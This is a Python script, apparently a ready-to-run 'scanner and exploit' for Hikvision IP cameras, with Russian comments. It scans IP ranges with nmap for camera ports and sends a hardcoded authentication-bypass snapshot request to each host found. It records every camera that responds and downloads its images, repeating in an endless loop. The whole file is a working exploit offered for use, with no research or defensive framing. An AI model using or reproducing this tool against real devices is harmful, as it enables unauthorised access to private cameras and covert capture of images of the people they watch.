import nmap
import requests
import argparse
import time
from urllib import request
from datetime import date

def download_snapshot_img(url, ip, port, location):
    file_url = url
    file = location + "_" + str(ip) + "-" + str(port) + "_" + str(date.today()) + ".jpg"
    try:
        request.urlretrieve(file_url, file)
        print(f"[+] Snapshot saved: {file}")
    except Exception as e:
        print(f"[!] Error downloading snapshot from {url}: {e}")

def is_vulnerable(url, verbose, ip, port, location):
    payload = "/onvif-http/snapshot?auth=YWRtaW46MTEK"
    try:
        r = requests.get(url + payload, timeout=2)
        status_code = r.status_code
    except requests.exceptions.RequestException as e:
        if verbose:
            print(f"[!] Connection error for {url}: {e}")
        return False
    
    if status_code == 200:
        print(f"[+] Vulnerable! --> {url}{payload} | Location: {location}")
        open('urls.txt', 'a+').write(f"{url}{payload}\n")
        download_snapshot_img(url + payload, ip, port, location)
        return True
    else:
        if verbose:
            print(f"[!] Not vulnerable: {url}")
        return False

def scan_network(ip_range, verbose, download_snapshot):
    nm = nmap.PortScanner()

    # Сканируем указанный диапазон IP
    for ip in ip_range:
        try:
            print(f"[!] Scanning {ip}...")
            nm.scan(hosts=ip, arguments="-p 80,554,8080")  # Сканируем на порты, типичные для камер
            for host in nm.all_hosts():
                if nm[host].state() == "up":
                    for proto in nm[host].all_protocols():
                        lport = nm[host][proto].keys()
                        for port in lport:
                            if port in [80, 554, 8080]:  # Проверяем только на порты, используемые камерами
                                url = f"http://{host}:{port}"
                                location = f"{host}_location"  # Вы можете адаптировать это для получения данных о местоположении
                                print(f"[!] Found open port {port} on {url}")
                                is_vulnerable(url, verbose, host, port, location)
        except Exception as e:
            print(f"[!] Error scanning {ip}: {e}")
        
        # Добавляем паузу между сканированиями для уменьшения нагрузки
        time.sleep(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Scanner and exploit for Hikvision Cameras')
    parser.add_argument('-d', '--dork', help='Custom dork for the scan', type=str)
    parser.add_argument('-s', '--savefile', action='store_true', help='Save snapshots from vulnerable cams')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode')
    parser.add_argument('-r', '--iprange', type=str, help='IP Range or Subnet to scan', required=True)
    args = parser.parse_args()

    verbose = args.verbose
    download_snapshot = args.savefile
    ip_range = args.iprange.split(',')

    print(f"[+] Verbose: {'on' if verbose else 'off'}")
    print(f"[+] Download snapshot: {'on' if download_snapshot else 'off'}")
    print(f"[+] IP Range to scan: {ip_range}")

    # Начинаем сканирование
    while True:
        try:
            scan_network(ip_range, verbose, download_snapshot)
        except Exception as e:
            print(f"\n[!] Unexpected error: {e}\n")
            time.sleep(5)  # Пауза перед повторной попыткой
